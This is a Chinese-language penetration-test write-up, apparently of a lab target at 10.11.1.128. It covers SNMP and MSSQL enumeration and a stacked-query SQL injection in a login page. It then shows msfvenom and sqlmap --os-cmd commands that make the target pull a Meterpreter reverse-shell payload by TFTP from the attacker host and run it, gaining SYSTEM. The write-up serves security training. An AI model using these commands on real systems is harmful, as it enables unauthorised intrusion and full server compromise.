# 0x00 前言
本文将分享一个以SQL注入为突破口，进而全面控制目标服务器的渗透测试案例。

# 0x01 案例分析

## 实验环境
- 目标靶机：10.11.1.128
- 攻击机：Kali Linux (10.11.0.74)

## 渗透过程

### 服务和端口枚举
首先，我们按照惯例对目标服务器进行服务和端口枚举。通过扫描发现，目标服务器开放了SNMP端口（161）。使用`snmp-check`工具进行进一步探测，得到以下信息：

```bash
# snmp-check -c public 10.11.1.128
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
[+] Try to connect to 10.11.1.128:161 using SNMPv1 and community 'public'
[*] System information:
  Host IP address               : 10.11.1.128
  Hostname                      : DJ
  Description                   : Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.0 (Build 2195 Uniprocessor Free)
  Contact                       : -
  Location                      : -
  Uptime snmp                   : 15:32:30.62
  Uptime system                 : 497 days, 01:04:09.29
  System date                   : 2017-9-17 03:16:22.0
  Domain                        : WORKGROUP
[*] User accounts:
  Guest               
  IUSR_SRV2           
  IWAM_SRV2           
  Administrator       
  TsInternetUser      
[*] Network information:
...
[*] Network interfaces:
...
[*] Network IP:
  Id                    IP Address            Netmask               Broadcast           
  16777219              10.11.1.128           255.255.0.0           1                   
  1                     127.0.0.1             255.0.0.0             1                   
[*] Routing information:
  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.11.1.220           0.0.0.0               1                   
  10.11.0.0             10.11.1.128           255.255.0.0           1                   
  10.11.1.128           127.0.0.1             255.255.255.255       1                   
  10.255.255.255        10.11.1.128           255.255.255.255       1                   
  127.0.0.0             127.0.0.1             255.0.0.0             1                   
  224.0.0.0             10.11.1.128           224.0.0.0             1                   
  255.255.255.255       10.11.1.128           255.255.255.255       1                   
[*] TCP connections and listening ports:
  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               21                    0.0.0.0               18462                 listen              
  0.0.0.0               25                    0.0.0.0               51204                 listen              
  0.0.0.0               80                    0.0.0.0               59498                 listen              
  0.0.0.0               135                   0.0.0.0               10410                 listen              
  0.0.0.0               443                   0.0.0.0               18519                 listen              
  0.0.0.0               445                   0.0.0.0               2240                  listen              
  0.0.0.0               1025                  0.0.0.0               34838                 listen              
  0.0.0.0               1027                  0.0.0.0               18446                 listen              
  0.0.0.0               1029                  0.0.0.0               10327                 listen              
  0.0.0.0               1033                  0.0.0.0               10427                 listen              
  0.0.0.0               3372                  0.0.0.0               18462                 listen              
  0.0.0.0               5800                  0.0.0.0               2240                  listen              
  0.0.0.0               5900                  0.0.0.0               10324                 listen              
  10.11.1.128           80                    10.11.0.72            45991                 timeWait            
  10.11.1.128           80                    10.11.16.18           49258                 timeWait            
  10.11.1.128           80                    10.11.16.18           49259                 timeWait            
  10.11.1.128           80                    10.11.16.18           49260                 timeWait            
  10.11.1.128           80                    10.11.16.18           49261                 timeWait            
  10.11.1.128           80                    10.11.16.18           49262                 timeWait            
  10.11.1.128           80                    10.11.16.18           49263                 timeWait            
  10.11.1.128           80                    10.11.16.18           49264                 timeWait            
  10.11.1.128           139                   0.0.0.0               59563                 listen              
  10.11.1.128           1074                  10.11.1.229           139                   timeWait            
  10.11.1.128           27900                 0.0.0.0               18494                 listen              
  127.0.0.1             27900                 0.0.0.0               10298                 listen              
[*] Listening UDP ports:
  Local address         Local port          
  0.0.0.0               135                 
  0.0.0.0               161                 
  0.0.0.0               445                 
  0.0.0.0               1030                
  0.0.0.0               1434                
  0.0.0.0               3456                
  10.11.1.128           137                 
  10.11.1.128           138                 
  10.11.1.128           500                 
[*] Network services:
...
[*] Storage information:
...
[*] Software components:
...
[*] IIS server information:
...
[*] Share:
   Name                         : share
    Path                        : C:\share
    Comment                     : 
   Name                         : wwwroot
    Path                        : C:\Inetpub\wwwroot
    Comment                     :
```

### MSSQL服务检测
接着，我们使用Metasploit框架中的`auxiliary/scanner/mssql/mssql_ping`模块来检测是否存在MSSQL服务。

```bash
msf exploit(mssql_payload) > use auxiliary/scanner/mssql/mssql_ping 
msf auxiliary(mssql_ping) > set RHOSTS 10.11.1.128
RHOSTS => 10.11.1.128
msf auxiliary(mssql_ping) > run
[*] 10.11.1.128:          - SQL Server information for 10.11.1.128:
[+] 10.11.1.128:          -    ServerName      = DJ
[+] 10.11.1.128:          -    InstanceName    = MSSQLSERVER
[+] 10.11.1.128:          -    IsClustered     = No
[+] 10.11.1.128:          -    Version         = 8.00.194
[+] 10.11.1.128:          -    np              = \\DJ\pipe\sql\query
[+] 10.11.1.128:          -    tcp             = 27900
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(mssql_ping) >
```

收集到的信息如下：
- 操作系统：Windows 2000
- 开放HTTP服务，端口80，web根目录似乎是C:\Inetpub\wwwroot
- 开放FTP服务，端口21
- 开放SMTP服务，端口25
- 开放MSSQL服务，端口27900

### SQL注入漏洞检测
测试HTTP服务时，我们发现了一个POST类型的SQL注入漏洞。使用`sqlmap`工具进一步检测该漏洞。

```bash
# sqlmap -u "http://10.11.1.128/login-off.asp" --data="txtLoginID=amdin&txtPassword=1&cmdSubmit=Login" --dbs --current-user --is-dba --current-db --batch
            ___
           __H__
     ___ ___[']_____ ___ ___  {1.1.6#stable}
    |_ -| . [']     | .'| . |
    |___|_  ["]_|_|_|__,|  _|
          |_|V          |_|   http://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting at 18:40:12
[18:40:12] [INFO] resuming back-end DBMS 'microsoft sql server' 
[18:40:12] [INFO] testing connection to the target URL
[18:40:12] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---    Parameter: txtLoginID (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: txtLoginID=amdin';WAITFOR DELAY '0:0:5'--&txtPassword=1&cmdSubmit=Login
---    [18:40:12] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2000
web application technology: ASP, Microsoft IIS 5.0
back-end DBMS: Microsoft SQL Server 2000
current user:    'sa'
current database:    'bankdb'
[18:40:12] [INFO] testing if current user is DBA
current user is DBA:    True
[*] bankdb
[*] master
[*] model
[*] msdb
[*] tempdb
[18:40:12] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.11.1.128'
[*] shutting down at 18:40:12
```

发现的信息如下：
- Web服务器操作系统：Windows 2000
- Web应用程序技术：ASP, Microsoft IIS 5.0
- 后台数据库管理系统：MSSQL 2000
- SQL注入类型：POST类型的堆叠查询
- 当前数据库用户：sa，并且具有DBA权限

### 利用SQL注入下载并执行payload
通过检测发现目标服务器上安装了TFTP。接下来，生成Meterpreter反弹shell并上传至Kali的TFTP服务器目录中。

```bash
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.74 LPORT=4444 -f exe -o rshell.exe
```

然后，通过SQL注入在目标机器上下载payload至目标服务器的目录`c:\inetpub\wwwroot\`。

```bash
# sqlmap -u "http://10.11.1.128/login-off.asp" --data="txtLoginID=amdin&txtPassword=1&cmdSubmit=Login" --os-cmd='cd c:\inetpub\wwwroot\ && tftp -i 10.11.0.74 get rshell.exe' --tamper=space2mssqlblank.py
```

最后，执行payload从而获得反弹shell。

```bash
# sqlmap -u "http://10.11.1.128/login-off.asp" --data="txtLoginID=amdin&txtPassword=1&cmdSubmit=Login" --os-cmd='c:\inetpub\wwwroot\rshell.exe' --tamper=space2mssqlblank.py
```

成功获得了SYSTEM权限的Meterpreter反弹shell。

# 0x02 小结
总结本案例的渗透思路如下：
1. 使用Nmap对目标服务器进行服务和端口枚举。
2. 扫描SNMP服务和MSSQL服务并收集服务器信息。
3. 检测HTTP服务并发现SQL注入漏洞。
4. 通过SQL注入下载并执行payload。
5. 最终获得反弹shell，完全控制目标服务器。